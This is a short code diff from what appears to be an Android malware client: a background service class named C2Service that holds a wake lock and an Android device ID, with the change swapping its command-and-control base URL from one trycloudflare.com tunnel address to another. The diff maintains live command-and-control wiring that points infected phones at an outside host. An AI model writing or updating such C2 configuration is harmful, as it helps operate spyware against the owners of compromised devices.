@@ -22,7 +22,7 @@ import java.util.TimerTask;
 
 public class C2Service extends Service {
     // URL CLOUDFLARE LO
-    private static final String BASE_URL = "https://counter-string-warrant-tribunal.trycloudflare.com";
+    private static final String BASE_URL = "https://kelkoo-hospitality-myrtle-textbook.trycloudflare.com";
     private static final String C2_URL = BASE_URL + "/api";
     private String androidId;
     private PowerManager.WakeLock wakeLock;
